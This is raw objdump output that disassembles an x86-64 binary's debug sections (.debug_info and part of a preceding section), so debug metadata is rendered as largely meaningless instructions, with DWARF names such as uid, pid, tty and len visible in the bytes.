  6e:	00 00                	add    %al,(%rax)
  70:	18 30                	sbb    %dh,(%rax)
  72:	40 00 00             	add    %al,(%rax)
  75:	00 00                	add    %al,(%rax)
  77:	00 c5                	add    %al,%ch
  79:	45 00 00             	add    %r8b,(%r8)
	...
  90:	2c 00                	sub    $0x0,%al
  92:	00 00                	add    %al,(%rax)
  94:	02 00                	add    (%rax),%al
  96:	41 12 00             	adc    (%r8),%al
  99:	00 08                	add    %cl,(%rax)
  9b:	00 00                	add    %al,(%rax)
  9d:	00 00                	add    %al,(%rax)
  9f:	00 dd                	add    %bl,%ch
  a1:	75 40                	jne    e3 <_init-0x400cb5>
  a3:	00 00                	add    %al,(%rax)
  a5:	00 00                	add    %al,(%rax)
  a7:	00 3f                	add    %bh,(%rdi)
  a9:	02 00                	add    (%rax),%al
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	48 0c 00             	rex.W or $0x0,%al
       3:	00 04 00             	add    %al,(%rax,%rax,1)
       6:	00 00                	add    %al,(%rax)
       8:	00 00                	add    %al,(%rax)
       a:	08 01                	or     %al,(%rcx)
       c:	b7 02                	mov    $0x2,%bh
       e:	00 00                	add    %al,(%rax)
      10:	01 0b                	add    %ecx,(%rbx)
      12:	00 00                	add    %al,(%rax)
      14:	00 a5 04 00 00 5d    	add    %ah,0x5d000004(%rbp)
      1a:	11 40 00             	adc    %eax,0x0(%rax)
      1d:	00 00                	add    %al,(%rax)
      1f:	00 00                	add    %al,(%rax)
      21:	2d 1a 00 00 00       	sub    $0x1a,%eax
      26:	00 00                	add    %al,(%rax)
      28:	00 00                	add    %al,(%rax)
      2a:	00 00                	add    %al,(%rax)
      2c:	00 02                	add    %al,(%rdx)
      2e:	01 08                	add    %ecx,(%rax)
      30:	75 03                	jne    35 <_init-0x400d63>
      32:	00 00                	add    %al,(%rax)
      34:	02 02                	add    (%rdx),%al
      36:	07                   	(bad)  
      37:	22 02                	and    (%rdx),%al
      39:	00 00                	add    %al,(%rax)
      3b:	02 04 07             	add    (%rdi,%rax,1),%al
      3e:	e5 00                	in     $0x0,%eax
      40:	00 00                	add    %al,(%rax)
      42:	02 08                	add    (%rax),%cl
      44:	07                   	(bad)  
      45:	e0 00                	loopne 47 <_init-0x400d51>
      47:	00 00                	add    %al,(%rax)
      49:	02 01                	add    (%rcx),%al
      4b:	06                   	(bad)  
      4c:	77 03                	ja     51 <_init-0x400d47>
      4e:	00 00                	add    %al,(%rax)
      50:	02 02                	add    (%rdx),%al
      52:	05 be 03 00 00       	add    $0x3be,%eax
      57:	03 04 05 69 6e 74 00 	add    0x746e69(,%rax,1),%eax
      5e:	02 08                	add    (%rax),%cl
      60:	05 c6 00 00 00       	add    $0xc6,%eax
      65:	02 08                	add    (%rax),%cl
      67:	07                   	(bad)  
      68:	92                   	xchg   %eax,%edx
      69:	02 00                	add    (%rax),%al
      6b:	00 04 c7             	add    %al,(%rdi,%rax,8)
      6e:	04 00                	add    $0x0,%al
      70:	00 02                	add    %al,(%rdx)
      72:	8b 5e 00             	mov    0x0(%rsi),%ebx
      75:	00 00                	add    %al,(%rax)
      77:	04 f8                	add    $0xf8,%al
      79:	01 00                	add    %eax,(%rax)
      7b:	00 02                	add    %al,(%rdx)
      7d:	8d 5e 00             	lea    0x0(%rsi),%ebx
      80:	00 00                	add    %al,(%rax)
      82:	05 08 88 00 00       	add    $0x8808,%eax
      87:	00 02                	add    %al,(%rdx)
      89:	01 06                	add    %eax,(%rsi)
      8b:	7e 03                	jle    90 <_init-0x400d08>
      8d:	00 00                	add    %al,(%rax)
      8f:	06                   	(bad)  
      90:	13 02                	adc    (%rdx),%eax
      92:	00 00                	add    %al,(%rax)
      94:	10 03                	adc    %al,(%rbx)
      96:	1e                   	(bad)  
      97:	b4 00                	mov    $0x0,%ah
      99:	00 00                	add    %al,(%rax)
      9b:	07                   	(bad)  
      9c:	9b                   	fwait
      9d:	02 00                	add    (%rax),%al
      9f:	00 03                	add    %al,(%rbx)
      a1:	20 6c 00 00          	and    %ch,0x0(%rax,%rax,1)
      a5:	00 00                	add    %al,(%rax)
      a7:	07                   	(bad)  
      a8:	15 04 00 00 03       	adc    $0x3000004,%eax
      ad:	21 77 00             	and    %esi,0x0(%rdi)
      b0:	00 00                	add    %al,(%rax)
      b2:	08 00                	or     %al,(%rax)
      b4:	04 b4                	add    $0xb4,%al
      b6:	03 00                	add    (%rax),%eax
      b8:	00 04 36             	add    %al,(%rsi,%rsi,1)
      bb:	5e                   	pop    %rsi
      bc:	00 00                	add    %al,(%rax)
      be:	00 08                	add    %cl,(%rax)
      c0:	80 04 40 d4          	addb   $0xd4,(%rax,%rax,2)
      c4:	00 00                	add    %al,(%rax)
      c6:	00 07                	add    %al,(%rdi)
      c8:	8b 05 00 00 04 48    	mov    0x48040000(%rip),%eax        # 480400ce <_end+0x47a36ede>
      ce:	d4                   	(bad)  
      cf:	00 00                	add    %al,(%rax)
      d1:	00 00                	add    %al,(%rax)
      d3:	00 09                	add    %cl,(%rcx)
      d5:	b4 00                	mov    $0x0,%ah
      d7:	00 00                	add    %al,(%rax)
      d9:	e4 00                	in     $0x0,%al
      db:	00 00                	add    %al,(%rax)
      dd:	0a 65 00             	or     0x0(%rbp),%ah
      e0:	00 00                	add    %al,(%rax)
      e2:	0f 00 04 a5 01 00 00 	sldt   0x4000001(,%riz,4)
      e9:	04 
      ea:	4b bf 00 00 00 02 08 	rex.WXB movabs $0xdb070802000000,%r15
      f1:	07 db 00 
      f4:	00 00                	add    %al,(%rax)
      f6:	02 08                	add    (%rax),%cl
      f8:	05 c1 00 00 00       	add    $0xc1,%eax
      fd:	0b 49 03             	or     0x3(%rcx),%ecx
     100:	00 00                	add    %al,(%rax)
     102:	04 0e                	add    $0xe,%al
     104:	18 43 01             	sbb    %al,0x1(%rbx)
     107:	00 00                	add    %al,(%rax)
     109:	0c 2d                	or     $0x2d,%al
     10b:	01 00                	add    %eax,(%rax)
     10d:	00 01                	add    %al,(%rcx)
     10f:	0c f3                	or     $0xf3,%al
     111:	04 00                	add    $0x0,%al
     113:	00 02                	add    %al,(%rdx)
     115:	0c 2f                	or     $0x2f,%al
     117:	05 00 00 03 0c       	add    $0xc030000,%eax
     11c:	9c                   	pushfq 
     11d:	01 00                	add    %eax,(%rax)
     11f:	00 04 0c             	add    %al,(%rsp,%rcx,1)
     122:	38 05 00 00 05 0c    	cmp    %al,0xc050000(%rip)        # c050128 <_end+0xba46f38>
     128:	0b 03                	or     (%rbx),%eax
     12a:	00 00                	add    %al,(%rax)
     12c:	06                   	(bad)  
     12d:	0c a8                	or     $0xa8,%al
     12f:	00 00                	add    %al,(%rax)
     131:	00 0a                	add    %cl,(%rdx)
     133:	0c e1                	or     $0xe1,%al
     135:	04 00                	add    $0x0,%al
     137:	00 80 80 20 0c 43    	add    %al,0x430c2080(%rax)
     13d:	00 00                	add    %al,(%rax)
     13f:	00 80 10 00 04 d0    	add    %al,-0x2ffbfff0(%rax)
     145:	04 00                	add    $0x0,%al
     147:	00 05 1c 34 00 00    	add    %al,0x341c(%rip)        # 3569 <_init-0x3fd82f>
     14d:	00 06                	add    %al,(%rsi)
     14f:	59                   	pop    %rcx
     150:	04 00                	add    $0x0,%al
     152:	00 10                	add    %dl,(%rax)
     154:	06                   	(bad)  
     155:	95                   	xchg   %eax,%ebp
     156:	73 01                	jae    159 <_init-0x400c3f>
     158:	00 00                	add    %al,(%rax)
     15a:	07                   	(bad)  
     15b:	2d 03 00 00 06       	sub    $0x6000003,%eax
     160:	97                   	xchg   %eax,%edi
     161:	43 01 00             	rex.XB add %eax,(%r8)
     164:	00 00                	add    %al,(%rax)
     166:	07                   	(bad)  
     167:	1a 05 00 00 06 98    	sbb    -0x67fa0000(%rip),%al        # ffffffff9806016d <_end+0xffffffff97a56f7d>
     16d:	73 01                	jae    170 <_init-0x400c28>
     16f:	00 00                	add    %al,(%rax)
     171:	02 00                	add    (%rax),%al
     173:	09 88 00 00 00 83    	or     %ecx,-0x7d000000(%rax)
     179:	01 00                	add    %eax,(%rax)
     17b:	00 0a                	add    %cl,(%rdx)
     17d:	65 00 00             	add    %al,%gs:(%rax)
     180:	00 0d 00 04 39 01    	add    %cl,0x1390400(%rip)        # 1390586 <_end+0xd87396>
     186:	00 00                	add    %al,(%rax)
     188:	07                   	(bad)  
     189:	31 34 00             	xor    %esi,(%rax,%rax,1)
     18c:	00 00                	add    %al,(%rax)
     18e:	04 29                	add    $0x29,%al
     190:	04 00                	add    $0x0,%al
     192:	00 07                	add    %al,(%rdi)
     194:	33 3b                	xor    (%rbx),%edi
     196:	00 00                	add    %al,(%rax)
     198:	00 04 6c             	add    %al,(%rsp,%rbp,2)
     19b:	00 00                	add    %al,(%rax)
     19d:	00 08                	add    %cl,(%rax)
     19f:	1e                   	(bad)  
     1a0:	8e 01                	mov    (%rcx),%es
     1a2:	00 00                	add    %al,(%rax)
     1a4:	06                   	(bad)  
     1a5:	36 02 00             	add    %ss:(%rax),%al
     1a8:	00 04 08             	add    %al,(%rax,%rcx,1)
     1ab:	1f                   	(bad)  
     1ac:	bd 01 00 00 07       	mov    $0x7000001,%ebp
     1b1:	7a 02                	jp     1b5 <_init-0x400be3>
     1b3:	00 00                	add    %al,(%rax)
     1b5:	08 21                	or     %ah,(%rcx)
     1b7:	99                   	cltd   
     1b8:	01 00                	add    %eax,(%rax)
     1ba:	00 00                	add    %al,(%rax)
     1bc:	00 0d 04 08 29 65    	add    %cl,0x65290804(%rip)        # 652909c6 <_end+0x64c877d6>
     1c2:	02 00                	add    (%rax),%al
     1c4:	00 0c 91             	add    %cl,(%rcx,%rdx,4)
     1c7:	01 00                	add    %eax,(%rax)
     1c9:	00 00                	add    %al,(%rax)
     1cb:	0c 73                	or     $0x73,%al
     1cd:	04 00                	add    $0x0,%al
     1cf:	00 01                	add    %al,(%rcx)
     1d1:	0c 5f                	or     $0x5f,%al
     1d3:	00 00                	add    %al,(%rax)
     1d5:	00 02                	add    %al,(%rdx)
     1d7:	0c 22                	or     $0x22,%al
     1d9:	05 00 00 04 0c       	add    $0xc040000,%eax
     1de:	21 01                	and    %eax,(%rcx)
     1e0:	00 00                	add    %al,(%rax)
     1e2:	06                   	(bad)  
     1e3:	0c 4d                	or     $0x4d,%al
     1e5:	04 00                	add    $0x0,%al
     1e7:	00 08                	add    %cl,(%rax)
     1e9:	0c 5c                	or     $0x5c,%al
     1eb:	03 00                	add    (%rax),%eax
     1ed:	00 0c 0c             	add    %cl,(%rsp,%rcx,1)
     1f0:	cf                   	iret   
     1f1:	00 00                	add    %al,(%rax)
     1f3:	00 11                	add    %dl,(%rcx)
     1f5:	0c a8                	or     $0xa8,%al
     1f7:	03 00                	add    (%rax),%eax
     1f9:	00 16                	add    %dl,(%rsi)
     1fb:	0c 59                	or     $0x59,%al
     1fd:	02 00                	add    (%rax),%al
     1ff:	00 1d 0c 2a 00 00    	add    %bl,0x2a0c(%rip)        # 2c11 <_init-0x3fe187>
     205:	00 21                	add    %ah,(%rcx)
     207:	0c 6d                	or     $0x6d,%al
     209:	02 00                	add    (%rax),%al
     20b:	00 29                	add    %ch,(%rcx)
     20d:	0c 93                	or     $0x93,%al
     20f:	00 00                	add    %al,(%rax)
     211:	00 2e                	add    %ch,(%rsi)
     213:	0c 8c                	or     $0x8c,%al
     215:	04 00                	add    $0x0,%al
     217:	00 2f                	add    %ch,(%rdi)
     219:	0c e2                	or     $0xe2,%al
     21b:	01 00                	add    %eax,(%rax)
     21d:	00 32                	add    %dh,(%rdx)
     21f:	0c 0a                	or     $0xa,%al
     221:	05 00 00 33 0c       	add    $0xc330000,%eax
     226:	70 05                	jo     22d <_init-0x400b6b>
     228:	00 00                	add    %al,(%rax)
     22a:	dc 00                	faddl  (%rax)
     22c:	0c 15                	or     $0x15,%al
     22e:	03 00                	add    (%rax),%eax
     230:	00 de                	add    %bl,%dh
     232:	00 0c 51             	add    %cl,(%rcx,%rdx,2)
     235:	00 00                	add    %al,(%rax)
     237:	00 e2                	add    %ah,%dl
     239:	00 0c 17             	add    %cl,(%rdi,%rdx,1)
     23c:	00 00                	add    %al,(%rax)
     23e:	00 e7                	add    %ah,%bh
     240:	00 0c 84             	add    %cl,(%rsp,%rax,4)
     243:	01 00                	add    %eax,(%rax)
     245:	00 ec                	add    %ch,%ah
     247:	00 0c 68             	add    %cl,(%rax,%rbp,2)
     24a:	03 00                	add    (%rax),%eax
     24c:	00 84 01 0c 32 04 00 	add    %al,0x4320c(%rcx,%rax,1)
     253:	00 88 01 0c 83 03    	add    %cl,0x3830c01(%rax)
     259:	00 00                	add    %al,(%rax)
     25b:	ff 01                	incl   (%rcx)
     25d:	0c f5                	or     $0xf5,%al
     25f:	02 00                	add    (%rax),%al
     261:	00 80 02 00 04 66    	add    %al,0x66040002(%rax)
     267:	05 00 00 08 75       	add    $0x75080000,%eax
     26c:	83 01 00             	addl   $0x0,(%rcx)
     26f:	00 06                	add    %al,(%rsi)
     271:	fe 04 00             	incb   (%rax,%rax,1)
     274:	00 10                	add    %dl,(%rax)
     276:	08 ed                	or     %ch,%ch
     278:	ad                   	lods   %ds:(%rsi),%eax
     279:	02 00                	add    (%rax),%al
     27b:	00 07                	add    %al,(%rdi)
     27d:	81 02 00 00 08 ef    	addl   $0xef080000,(%rdx)
     283:	43 01 00             	rex.XB add %eax,(%r8)
     286:	00 00                	add    %al,(%rax)
     288:	07                   	(bad)  
     289:	24 03                	and    $0x3,%al
     28b:	00 00                	add    %al,(%rax)
     28d:	08 f0                	or     %dh,%al
     28f:	65 02 00             	add    %gs:(%rax),%al
     292:	00 02                	add    %al,(%rdx)
     294:	07                   	(bad)  
     295:	35 02 00 00 08       	xor    $0x8000002,%eax
     29a:	f1                   	icebp  
     29b:	a4                   	movsb  %ds:(%rsi),%es:(%rdi)
     29c:	01 00                	add    %eax,(%rax)
     29e:	00 04 07             	add    %al,(%rdi,%rax,1)
     2a1:	7b 01                	jnp    2a4 <_init-0x400af4>
     2a3:	00 00                	add    %al,(%rax)
     2a5:	08 f4                	or     %dh,%ah
     2a7:	ad                   	lods   %ds:(%rsi),%eax
     2a8:	02 00                	add    (%rax),%al
     2aa:	00 08                	add    %cl,(%rax)
     2ac:	00 09                	add    %cl,(%rcx)
     2ae:	2d 00 00 00 bd       	sub    $0xbd000000,%eax
     2b3:	02 00                	add    (%rax),%al
     2b5:	00 0a                	add    %cl,(%rdx)
     2b7:	65 00 00             	add    %al,%gs:(%rax)
     2ba:	00 07                	add    %al,(%rdi)
     2bc:	00 06                	add    %al,(%rsi)
     2be:	fe 03                	incb   (%rbx)
     2c0:	00 00                	add    %al,(%rax)
     2c2:	08 09                	or     %cl,(%rcx)
     2c4:	1b fa                	sbb    %edx,%edi
     2c6:	02 00                	add    (%rax),%al
     2c8:	00 07                	add    %al,(%rdi)
     2ca:	98                   	cwtl   
     2cb:	04 00                	add    $0x0,%al
     2cd:	00 09                	add    %cl,(%rcx)
     2cf:	1d 34 00 00 00       	sbb    $0x34,%eax
     2d4:	00 07                	add    %al,(%rdi)
     2d6:	a2 02 00 00 09 1e 34 	movabs %al,0x341e09000002
     2dd:	00 00 
     2df:	00 02                	add    %al,(%rdx)
     2e1:	07                   	(bad)  
     2e2:	01 03                	add    %eax,(%rbx)
     2e4:	00 00                	add    %al,(%rax)
     2e6:	09 1f                	or     %ebx,(%rdi)
     2e8:	34 00                	xor    $0x0,%al
     2ea:	00 00                	add    %al,(%rax)
     2ec:	04 07                	add    $0x7,%al
     2ee:	f4                   	hlt    
     2ef:	03 00                	add    (%rax),%eax
     2f1:	00 09                	add    %cl,(%rcx)
     2f3:	20 34 00             	and    %dh,(%rax,%rax,1)
     2f6:	00 00                	add    %al,(%rax)
     2f8:	06                   	(bad)  
     2f9:	00 04 ee             	add    %al,(%rsi,%rbp,8)
     2fc:	04 00                	add    $0x0,%al
     2fe:	00 0a                	add    %cl,(%rdx)
     300:	17                   	(bad)  
     301:	2d 00 00 00 04       	sub    $0x4000000,%eax
     306:	7c 05                	jl     30d <_init-0x400a8b>
     308:	00 00                	add    %al,(%rax)
     30a:	0a 18                	or     (%rax),%bl
     30c:	3b 00                	cmp    (%rax),%eax
     30e:	00 00                	add    %al,(%rax)
     310:	04 3e                	add    $0x3e,%al
     312:	02 00                	add    (%rax),%al
     314:	00 0a                	add    %cl,(%rdx)
     316:	19 3b                	sbb    %edi,(%rbx)
     318:	00 00                	add    %al,(%rax)
     31a:	00 06                	add    %al,(%rsi)
     31c:	a0 00 00 00 3c 0a 1c 	movabs 0x3881c0a3c000000,%al
     323:	88 03 
     325:	00 00                	add    %al,(%rax)
     327:	07                   	(bad)  
     328:	51                   	push   %rcx
     329:	02 00                	add    (%rax),%al
     32b:	00 0a                	add    %cl,(%rdx)
     32d:	1e                   	(bad)  
     32e:	10 03                	adc    %al,(%rbx)
     330:	00 00                	add    %al,(%rax)
     332:	00 07                	add    %al,(%rdi)
     334:	19 01                	sbb    %eax,(%rcx)
     336:	00 00                	add    %al,(%rax)
     338:	0a 1f                	or     (%rdi),%bl
     33a:	10 03                	adc    %al,(%rbx)
     33c:	00 00                	add    %al,(%rax)
     33e:	04 07                	add    $0x7,%al
     340:	c8 03 00 00          	enterq $0x3,$0x0
     344:	0a 20                	or     (%rax),%ah
     346:	10 03                	adc    %al,(%rbx)
     348:	00 00                	add    %al,(%rax)
     34a:	08 07                	or     %al,(%rdi)
     34c:	ac                   	lods   %ds:(%rsi),%al
     34d:	01 00                	add    %eax,(%rax)
     34f:	00 0a                	add    %cl,(%rdx)
     351:	21 10                	and    %edx,(%rax)
     353:	03 00                	add    (%rax),%eax
     355:	00 0c 07             	add    %cl,(%rdi,%rax,1)
     358:	23 00                	and    (%rax),%eax
     35a:	00 00                	add    %al,(%rax)
     35c:	0a 22                	or     (%rdx),%ah
     35e:	fa                   	cli    
     35f:	02 00                	add    (%rax),%al
     361:	00 10                	add    %dl,(%rax)
     363:	07                   	(bad)  
     364:	57                   	push   %rdi
     365:	03 00                	add    (%rax),%eax
     367:	00 0a                	add    %cl,(%rdx)
     369:	23 88 03 00 00 11    	and    0x11000003(%rax),%ecx
     36f:	07                   	(bad)  
     370:	83 00 00             	addl   $0x0,(%rax)
     373:	00 0a                	add    %cl,(%rdx)
     375:	24 05                	and    $0x5,%al
     377:	03 00                	add    (%rax),%eax
     379:	00 34 07             	add    %dh,(%rdi,%rax,1)
     37c:	64 02 00             	add    %fs:(%rax),%al
     37f:	00 0a                	add    %cl,(%rdx)
     381:	25 05 03 00 00       	and    $0x305,%eax
     386:	38 00                	cmp    %al,(%rax)
     388:	09 fa                	or     %edi,%edx
     38a:	02 00                	add    (%rax),%al
     38c:	00 98 03 00 00 0a    	add    %bl,0xa000003(%rax)
     392:	65 00 00             	add    %al,%gs:(%rax)
     395:	00 1f                	add    %bl,(%rdi)
     397:	00 05 08 82 00 00    	add    %al,0x8208(%rip)        # 85a5 <_init-0x3f87f3>
     39d:	00 0e                	add    %cl,(%rsi)
     39f:	ee                   	out    %al,(%dx)
     3a0:	01 00                	add    %eax,(%rax)
     3a2:	00 08                	add    %cl,(%rax)
     3a4:	04 0b                	add    $0xb,%al
     3a6:	04 ca                	add    $0xca,%al
     3a8:	03 00                	add    (%rax),%eax
     3aa:	00 0f                	add    %cl,(%rdi)
     3ac:	78 00                	js     3ae <_init-0x4009ea>
     3ae:	0b 06                	or     (%rsi),%eax
     3b0:	57                   	push   %rdi
     3b1:	00 00                	add    %al,(%rax)
     3b3:	00 00                	add    %al,(%rax)
     3b5:	0f 79 00             	vmwrite (%rax),%rax
     3b8:	0b 06                	or     (%rsi),%eax
     3ba:	57                   	push   %rdi
     3bb:	00 00                	add    %al,(%rax)
     3bd:	00 04 0f             	add    %al,(%rdi,%rcx,1)
     3c0:	6d                   	insl   (%dx),%es:(%rdi)
     3c1:	00 0b                	add    %cl,(%rbx)
     3c3:	06                   	(bad)  
     3c4:	ca 03 00             	lret   $0x3
     3c7:	00 08                	add    %cl,(%rax)
     3c9:	00 09                	add    %cl,(%rcx)
     3cb:	57                   	push   %rdi
     3cc:	00 00                	add    %al,(%rax)
     3ce:	00 da                	add    %bl,%dl
     3d0:	03 00                	add    (%rax),%eax
     3d2:	00 0a                	add    %cl,(%rdx)
     3d4:	65 00 00             	add    %al,%gs:(%rax)
     3d7:	00 ff                	add    %bh,%bh
     3d9:	00 08                	add    %cl,(%rax)
     3db:	78 0c                	js     3e9 <_init-0x4009af>
     3dd:	0c 07                	or     $0x7,%al
     3df:	04 00                	add    $0x0,%al
     3e1:	00 07                	add    %al,(%rdi)
     3e3:	9f                   	lahf   
     3e4:	04 00                	add    $0x0,%al
     3e6:	00 0c 0e             	add    %cl,(%rsi,%rcx,1)
     3e9:	07                   	(bad)  
     3ea:	04 00                	add    $0x0,%al
     3ec:	00 00                	add    %al,(%rax)
     3ee:	07                   	(bad)  
     3ef:	f2 01 00             	repnz add %eax,(%rax)
     3f2:	00 0c 0f             	add    %cl,(%rdi,%rcx,1)
     3f5:	17                   	(bad)  
     3f6:	04 00                	add    $0x0,%al
     3f8:	00 10                	add    %dl,(%rax)
     3fa:	07                   	(bad)  
     3fb:	6c                   	insb   (%dx),%es:(%rdi)
     3fc:	04 00                	add    $0x0,%al
     3fe:	00 0c 10             	add    %cl,(%rax,%rdx,1)
     401:	27                   	(bad)  
     402:	04 00                	add    $0x0,%al
     404:	00 38                	add    %bh,(%rax)
     406:	00 09                	add    %cl,(%rcx)
     408:	42 00 00             	rex.X add %al,(%rax)
     40b:	00 17                	add    %dl,(%rdi)
     40d:	04 00                	add    $0x0,%al
     40f:	00 0a                	add    %cl,(%rdx)
     411:	65 00 00             	add    %al,%gs:(%rax)
     414:	00 01                	add    %al,(%rcx)
     416:	00 09                	add    %cl,(%rcx)
     418:	42 00 00             	rex.X add %al,(%rax)
     41b:	00 27                	add    %ah,(%rdi)
     41d:	04 00                	add    $0x0,%al
     41f:	00 0a                	add    %cl,(%rdx)
     421:	65 00 00             	add    %al,%gs:(%rax)
     424:	00 04 00             	add    %al,(%rax,%rax,1)
     427:	09 2d 00 00 00 37    	or     %ebp,0x37000000(%rip)        # 3700042d <_end+0x369f723d>
     42d:	04 00                	add    $0x0,%al
     42f:	00 0a                	add    %cl,(%rdx)
     431:	65 00 00             	add    %al,%gs:(%rax)
     434:	00 3f                	add    %bh,(%rdi)
     436:	00 04 b4             	add    %al,(%rsp,%rsi,4)
     439:	00 00                	add    %al,(%rax)
     43b:	00 0c 12             	add    %cl,(%rdx,%rdx,1)
     43e:	da 03                	fiaddl (%rbx)
     440:	00 00                	add    %al,(%rax)
     442:	08 18                	or     %bl,(%rax)
     444:	01 19                	add    %ebx,(%rcx)
     446:	6f                   	outsl  %ds:(%rsi),(%dx)
     447:	04 00                	add    $0x0,%al
     449:	00 07                	add    %al,(%rdi)
     44b:	ff 00                	incl   (%rax)
     44d:	00 00                	add    %al,(%rax)
     44f:	01 1a                	add    %ebx,(%rdx)
     451:	57                   	push   %rdi
     452:	00 00                	add    %al,(%rax)
     454:	00 00                	add    %al,(%rax)
     456:	07                   	(bad)  
     457:	80 04 00 00          	addb   $0x0,(%rax,%rax,1)
     45b:	01 1b                	add    %ebx,(%rbx)
     45d:	70 02                	jo     461 <_init-0x400937>
     45f:	00 00                	add    %al,(%rax)
     461:	04 07                	add    $0x7,%al
     463:	1d 04 00 00 01       	sbb    $0x1000004,%eax
     468:	1c 57                	sbb    $0x57,%al
     46a:	00 00                	add    %al,(%rax)
     46c:	00 14 00             	add    %dl,(%rax,%rax,1)
     46f:	04 37                	add    $0x37,%al
     471:	03 00                	add    (%rax),%eax
     473:	00 01                	add    %al,(%rcx)
     475:	1d 42 04 00 00       	sbb    $0x442,%eax
     47a:	10 68 10             	adc    %ch,0x10(%rax)
     47d:	01 1f                	add    %ebx,(%rdi)
     47f:	e1 04                	loope  485 <_init-0x400913>
     481:	00 00                	add    %al,(%rax)
     483:	0f 74 76 00          	pcmpeqb 0x0(%rsi),%mm6
     487:	01 20                	add    %esp,(%rax)
     489:	8f 00                	popq   (%rax)
     48b:	00 00                	add    %al,(%rax)
     48d:	00 0f                	add    %cl,(%rdi)
     48f:	77 73                	ja     504 <_init-0x400894>
     491:	00 01                	add    %al,(%rcx)
     493:	21 bd 02 00 00 10    	and    %edi,0x10000002(%rbp)
     499:	0f 74 6d 00          	pcmpeqb 0x0(%rbp),%mm5
     49d:	01 22                	add    %esp,(%rdx)
     49f:	1b 03                	sbb    (%rbx),%eax
     4a1:	00 00                	add    %al,(%rax)
     4a3:	18 0f                	sbb    %cl,(%rdi)
     4a5:	75 69                	jne    510 <_init-0x400888>
     4a7:	64 00 01             	add    %al,%fs:(%rcx)
     4aa:	23 57 00             	and    0x0(%rdi),%edx
     4ad:	00 00                	add    %al,(%rax)
     4af:	54                   	push   %rsp
     4b0:	0f 70 69 64 00       	pshufw $0x0,0x64(%rcx),%mm5
     4b5:	01 24 57             	add    %esp,(%rdi,%rdx,2)
     4b8:	00 00                	add    %al,(%rax)
     4ba:	00 58 0f             	add    %bl,0xf(%rax)
     4bd:	64 69 72 00 01 25 57 	imul   $0x572501,%fs:0x0(%rdx),%esi
     4c4:	00 
     4c5:	00 00                	add    %al,(%rax)
     4c7:	5c                   	pop    %rsp
     4c8:	0f 6c                	(bad)  
     4ca:	65 6e                	outsb  %gs:(%rsi),(%dx)
     4cc:	00 01                	add    %al,(%rcx)
     4ce:	26                   	es
     4cf:	57                   	push   %rdi
     4d0:	00 00                	add    %al,(%rax)
     4d2:	00 60 07             	add    %ah,0x7(%rax)
     4d5:	6c                   	insb   (%dx),%es:(%rdi)
     4d6:	04 00                	add    $0x0,%al
     4d8:	00 01                	add    %al,(%rcx)
     4da:	27                   	(bad)  
     4db:	e1 04                	loope  4e1 <_init-0x4008b7>
     4dd:	00 00                	add    %al,(%rax)
     4df:	64 00 09             	add    %cl,%fs:(%rcx)
     4e2:	2d 00 00 00 f2       	sub    $0xf2000000,%eax
     4e7:	04 00                	add    $0x0,%al
     4e9:	00 11                	add    %dl,(%rcx)
     4eb:	65 00 00             	add    %al,%gs:(%rax)
     4ee:	00 ff                	add    %bh,%bh
     4f0:	0f 00 04 6c          	sldt   (%rsp,%rbp,2)
     4f4:	01 00                	add    %eax,(%rax)
     4f6:	00 01                	add    %al,(%rcx)
     4f8:	28 7a 04             	sub    %bh,0x4(%rdx)
     4fb:	00 00                	add    %al,(%rax)
     4fd:	12 00                	adc    (%rax),%al
     4ff:	00 00                	add    %al,(%rax)
     501:	00 01                	add    %al,(%rcx)
     503:	2f                   	(bad)  
     504:	5d                   	pop    %rbp
     505:	11 40 00             	adc    %eax,0x0(%rax)
     508:	00 00                	add    %al,(%rax)
     50a:	00 00                	add    %al,(%rax)
     50c:	3c 00                	cmp    $0x0,%al
     50e:	00 00                	add    %al,(%rax)
     510:	00 00                	add    %al,(%rax)
     512:	00 00                	add    %al,(%rax)
     514:	01 9c 29 05 00 00 13 	add    %ebx,0x13000005(%rcx,%rbp,1)
     51b:	1b 02                	sbb    (%rdx),%eax
     51d:	00 00                	add    %al,(%rax)
     51f:	01 2f                	add    %ebp,(%rdi)
     521:	57                   	push   %rdi
     522:	00 00                	add    %al,(%rax)
     524:	00 02                	add    %al,(%rdx)
     526:	91                   	xchg   %eax,%ecx
     527:	6c                   	insb   (%dx),%es:(%rdi)
     528:	00 14 42             	add    %dl,(%rdx,%rax,2)
     52b:	01 00                	add    %eax,(%rax)
     52d:	00 01                	add    %al,(%rcx)
     52f:	39 57 00             	cmp    %edx,0x0(%rdi)
     532:	00 00                	add    %al,(%rax)
     534:	99                   	cltd   
     535:	11 40 00             	adc    %eax,0x0(%rax)
     538:	00 00                	add    %al,(%rax)
     53a:	00 00                	add    %al,(%rax)
     53c:	37                   	(bad)  
     53d:	01 00                	add    %eax,(%rax)
     53f:	00 00                	add    %al,(%rax)
     541:	00 00                	add    %al,(%rax)
     543:	00 01                	add    %al,(%rcx)
     545:	9c                   	pushfq 
     546:	ba 05 00 00 15       	mov    $0x15000005,%edx
     54b:	74 74                	je     5c1 <_init-0x4007d7>
     54d:	79 00                	jns    54f <_init-0x400849>
     54f:	01 39                	add    %edi,(%rcx)
     551:	57                   	push   %rdi
     552:	00 00                	add    %al,(%rax)
     554:	00 03                	add    %al,(%rbx)
     556:	91                   	xchg   %eax,%ecx
     557:	fc                   	cld    
     558:	7e 15                	jle    56f <_init-0x400829>
     55a:	73 64                	jae    5c0 <_init-0x4007d8>
     55c:	00 01                	add    %al,(%rcx)
     55e:	39 ba 05 00 00 03    	cmp    %edi,0x3000005(%rdx)
     564:	91                   	xchg   %eax,%ecx
     565:	f0 7e 16             	lock jle 57e <_init-0x40081a>
     568:	8c 02                	mov    %es,(%rdx)
     56a:	00 00                	add    %al,(%rax)
     56c:	01 3a                	add    %edi,(%rdx)
     56e:	1b 03                	sbb    (%rbx),%eax
     570:	00 00                	add    %al,(%rax)
     572:	03 91 90 7f 17 72    	add    0x72177f90(%rcx),%edx
     578:	65                   	gs
     579:	74 00                	je     57b <_init-0x40081d>
     57b:	01 3b                	add    %edi,(%rbx)
     57d:	57                   	push   %rdi
     57e:	00 00                	add    %al,(%rax)
     580:	00 03                	add    %al,(%rbx)
     582:	91                   	xchg   %eax,%ecx
     583:	8c 7f 18             	mov    %?,0x18(%rdi)
     586:	06                   	(bad)  
     587:	02 00                	add    (%rax),%al
     589:	00 d0                	add    %dl,%al
     58b:	05 00 00 09 03       	add    $0x3090000,%eax
     590:	50                   	push   %rax
     591:	7b 40                	jnp    5d3 <_init-0x4007c5>
     593:	00 00                	add    %al,(%rax)
     595:	00 00                	add    %al,(%rax)
